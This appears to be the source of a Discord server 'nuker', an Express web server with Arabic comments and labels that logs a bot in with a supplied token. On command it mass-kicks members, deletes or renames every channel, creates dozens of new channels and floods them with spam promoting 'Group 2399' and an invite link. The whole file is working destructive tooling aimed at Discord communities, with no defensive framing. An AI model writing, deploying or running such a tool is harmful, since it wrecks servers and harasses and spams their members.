const { Client, GatewayIntentBits, ChannelType } = require('discord.js');
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(bodyParser.json());

app.get('/', (req, res) => res.sendFile(__dirname + '/index.html'));

app.post('/execute', async (req, res) => {
    const { token, guildId, action, customName, customMsg } = req.body;
    
    // تعريف البوت بـ Intents كاملة عشان ما يعلق
    const client = new Client({ 
        intents: [3276799] 
    });

    try {
        await client.login(token);
        const guild = await client.guilds.fetch(guildId);
        if (!guild) return res.status(404).send({ status: '❌ السيرفر غير موجود' });

        const name = customName || "Group 2399";
        const msg = customMsg || "# Group 2399 is here\nhttps://discord.gg/2399k";

        // تنفيذ الأوامر (تطابق دقيق مع HTML)
        if (action === 'طرد الجميع') {
            const members = await guild.members.fetch();
            members.forEach(m => { if(m.kickable) m.kick().catch(() => {}); });
        }

        if (action === 'تغيير الأسماء') {
            guild.channels.cache.forEach(c => c.setName(name).catch(() => {}));
        }

        if (action === 'إنشاء رومات') {
            for (let i = 0; i < 60; i++) {
                setTimeout(() => {
                    guild.channels.create({ name: name, type: ChannelType.GuildText }).catch(() => {});
                }, i * 300);
            }
        }

        if (action === 'إرسال سبام') {
            guild.channels.cache.filter(c => c.type === ChannelType.GuildText).forEach(ch => {
                for (let i = 0; i < 40; i++) {
                    setTimeout(() => ch.send(msg).catch(() => {}), i * 800);
                }
            });
        }

        if (action === 'ابدأ التدمير 💀') {
            const members = await guild.members.fetch();
            members.forEach(m => { if(m.kickable) m.kick().catch(() => {}); });
            guild.channels.cache.forEach(c => c.delete().catch(() => {}));
            
            for (let i = 0; i < 60; i++) {
                setTimeout(() => {
                    guild.channels.create({ name: name, type: ChannelType.GuildText })
                    .then(ch => {
                        for(let j=0; j<20; j++) setTimeout(() => ch.send(msg).catch(() => {}), j * 900);
                    }).catch(() => {});
                }, i * 400);
            }
        }

        res.send({ status: `🚀 تم إطلاق [${action}]!` });
    } catch (e) {
        res.status(500).send({ status: '❌ خطأ: التوكن غلط أو مشكلة في الصلاحيات' });
    }
});

app.listen(process.env.PORT || 3000);
